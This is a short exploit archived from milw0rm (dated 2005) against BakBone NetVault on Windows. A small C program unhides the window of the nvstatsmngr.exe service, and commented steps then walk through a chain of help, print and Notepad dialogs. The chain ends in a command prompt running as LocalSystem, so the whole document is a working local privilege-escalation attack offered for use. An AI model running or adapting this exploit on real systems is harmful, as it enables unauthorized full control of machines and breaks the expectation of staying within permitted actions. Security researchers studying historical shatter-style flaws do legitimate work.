// ===== Start UnhideNetVaultServiceWindow.c ======
#include <stdio.h>
#include <windows.h>

int main( void )
{
	HWND hWnd;
	char szWindowName[] = "C:\\Program Files\\BakBone Software\\NetVault\\bin\\nvstatsmngr.exe";

	printf( "Finding window %s\n", szWindowName );

	hWnd = FindWindow( NULL, szWindowName );

	if ( hWnd == NULL )
	{
		printf( "ERROR! Could not find window %s\n", szWindowName );
	
		exit( 1 );
	}

	ShowWindow( hWnd, SW_SHOW );

	return 0;
}
// ===== End UnhideNetVaultServiceWindow.c ======

/*
1. The C:\Program Files\BakBone Software\NetVault\bin\nvstatsmngr.exe window will
   appear. Access the window menu in the upper left and click Properties.

2. Right click on the word Window under the Display Options and click What's This?

3. Right click on the help text that is shown in yellow and click Print Topic.

4. Right click on any printer and click Open.

5. Click Help, Help Topics.

6. Right click in the right side of the help screen and click View Source.

7. Notepad will appear (running under the context of the LocalSystem account).
   Click File, click Open.

8. Change Files of type: to All Files, navigate to the system32 directory and
   locate cmd.exe.  Right click cmd.exe and choose Open.

The result is a command prompt running under the context of the LocalSystem
account.

*/

// milw0rm.com [2005-04-27]
